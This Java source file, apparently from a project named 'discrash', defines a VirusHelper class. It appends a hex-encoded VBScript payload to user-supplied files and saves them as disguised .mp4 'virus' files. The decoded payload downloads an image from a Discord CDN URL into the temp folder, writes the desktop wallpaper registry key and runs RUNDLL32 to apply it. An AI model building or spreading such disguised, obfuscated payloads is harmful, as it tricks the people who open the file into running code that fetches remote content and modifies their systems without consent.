package com.authxero.discrash.helpers;

import com.authxero.discrash.storage.FileSystemStorageService;

import java.nio.file.Files;
import java.util.concurrent.TimeUnit;

public class VirusHelper extends Helper {
    public static VirusHelper instance = null;
    private static final String virusHex = "0a 53 65 74 20 6f 62 6a 53 68 65 6c 6c 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 0a 53 65 74 20 6f 62 6a 45 6e 76 20 3d 20 6f 62 6a 53 68 65 6c 6c 2e 45 6e 76 69 72 6f 6e 6d 65 6e 74 28 22 55 73 65 72 22 29 0a 20 0a 73 74 72 44 69 72 65 63 74 6f 72 79 20 3d 20 6f 62 6a 53 68 65 6c 6c 2e 45 78 70 61 6e 64 45 6e 76 69 72 6f 6e 6d 65 6e 74 53 74 72 69 6e 67 73 28 22 25 74 65 6d 70 25 22 29 0a 20 0a 64 69 6d 20 78 48 74 74 70 3a 20 53 65 74 20 78 48 74 74 70 20 3d 20 63 72 65 61 74 65 6f 62 6a 65 63 74 28 22 4d 69 63 72 6f 73 6f 66 74 2e 58 4d 4c 48 54 54 50 22 29 0a 64 69 6d 20 62 53 74 72 6d 3a 20 53 65 74 20 62 53 74 72 6d 20 3d 20 63 72 65 61 74 65 6f 62 6a 65 63 74 28 22 41 64 6f 64 62 2e 53 74 72 65 61 6d 22 29 0a 78 48 74 74 70 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74 70 73 3a 2f 2f 63 64 6e 2e 64 69 73 63 6f 72 64 61 70 70 2e 63 6f 6d 2f 65 6d 6f 6a 69 73 2f 36 38 31 35 37 37 36 32 35 33 39 34 38 37 32 33 37 30 2e 70 6e 67 3f 76 3d 31 22 2c 20 46 61 6c 73 65 0a 78 48 74 74 70 2e 53 65 6e 64 0a 20 0a 77 69 74 68 20 62 53 74 72 6d 0a 20 20 20 20 2e 74 79 70 65 20 3d 20 31 20 27 2f 2f 62 69 6e 61 72 79 0a 20 20 20 20 2e 6f 70 65 6e 0a 20 20 20 20 2e 77 72 69 74 65 20 78 48 74 74 70 2e 72 65 73 70 6f 6e 73 65 42 6f 64 79 0a 20 20 20 20 2e 73 61 76 65 74 6f 66 69 6c 65 20 73 74 72 44 69 72 65 63 74 6f 72 79 20 2b 20 22 5c 6d 79 49 6d 61 67 65 2e 70 6e 67 22 2c 20 32 20 27 2f 2f 6f 76 65 72 77 72 69 74 65 0a 65 6e 64 20 77 69 74 68 0a 20 0a 6f 62 6a 53 68 65 6c 6c 2e 52 65 67 57 72 69 74 65 20 22 48 4b 43 55 5c 43 6f 6e 74 72 6f 6c 20 50 61 6e 65 6c 5c 44 65 73 6b 74 6f 70 5c 57 61 6c 6c 70 61 70 65 72 22 2c 20 73 74 72 44 69 72 65 63 74 6f 72 79 20 2b 20 22 5c 6d 79 49 6d 61 67 65 2e 70 6e 67 22 0a 6f 62 6a 53 68 65 6c 6c 2e 52 75 6e 20 22 25 77 69 6e 64 69 72 25 5c 53 79 73 74 65 6d 33 32 5c 52 55 4e 44 4c 4c 33 32 2e 45 58 45 20 75 73 65 72 33 32 2e 64 6c 6c 2c 55 70 64 61 74 65 50 65 72 55 73 65 72 53 79 73 74 65 6d 50 61 72 61 6d 65 74 65 72 73 22 2c 20 31 2c 20 54 72 75 65";
    public VirusHelper() {
        super();
        instance = this;
    }

    public String generateCrashVideo(String fileNameInput) throws Exception {
        try {
            System.out.println("Beginning to generate virus file " + fileNameInput);
            String tempFileName = UtilHelper.generateFileName(32);
            byte[] ba = Files.readAllBytes(FileSystemStorageService.rootLocation.resolve(fileNameInput));
            String hexArr = UtilHelper.toHexFromBytes(ba);
            String[] thisThingy2 = UtilHelper.concatWithArrayCopy(hexArr.toLowerCase().split(" "),virusHex.split(" "));
            byte[] theMillionthByteArray = UtilHelper.hexStringToByteArray(String.join("", thisThingy2));
            UtilHelper.createFileAndWriteBytes(tempFileName + ".mp4",theMillionthByteArray);
            UtilHelper.deleteFile(fileNameInput);
            FireAndForgetRunnable forgetRunnableHelper = new FireAndForgetRunnable(() -> {
                TimeUnit.MINUTES.sleep(10);
                UtilHelper.deleteFile(tempFileName + ".mp4");
            });
            ffe.exec(forgetRunnableHelper);
            System.out.println(tempFileName + ".mp4 generated! File will be deleted in 10 minutes.");
            return tempFileName + ".mp4";
        } catch (Exception ex) {
            throw new Exception(ex.getMessage(), ex);
        }
    }
}
